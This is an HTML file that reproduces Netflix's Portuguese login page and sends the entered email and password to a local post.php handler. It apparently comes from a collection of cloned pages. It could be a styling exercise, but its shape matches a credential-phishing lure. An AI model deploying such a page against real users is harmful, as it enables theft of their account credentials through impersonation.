<!DOCTYPE html>
<html lang="pt-br">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login | Netflix</title>
  <link rel="stylesheet" href="/clone-pages/netflix-login/style.css">
</head>

<body>
  <div class="ghost-um">
  </div>
  <header>
    <div class="logo">
      <a href="./login.html">
        <img src="./logo.svg" alt="Netflix logomarca">
      </a>
    </div>
  </header>


  <main>
    <div class="login-container">
      <div class="titulo">
        <h2>Entrar</h2>
        <div class="login-form">

          <form action="./post.php" method="post">
            <input type="text" name="email" placeholder="Email ou número de telefone">

            <input type="password" name="senha" placeholder="Senha">
            <br />
            <button type="submit" id="btn-entrar">Entrar</button>

            <label class="container">
              <input type="checkbox">
              <p>Lembrar-se de mim</p>
              <span class="checkmark"></span>
            </label>
          </form>
        </div>
      </div>
      <br /><br /><br />
      <div class="infos">
        <div class="assinatura">
          <p>Novo por aqui? <span class="link-span"><a href="./index.html">Assine agora</a></span>.</p>
        </div>
        <div class="aviso">
          <p>Esta página é protegida pelo Google reCAPTCHA para garantir que você não é um robô <span class="link-span"><a href="./index.html">Saiba mais</a></span>.</p>
        </div>
      </div>
    </div>
  </main>

</body>

</html>
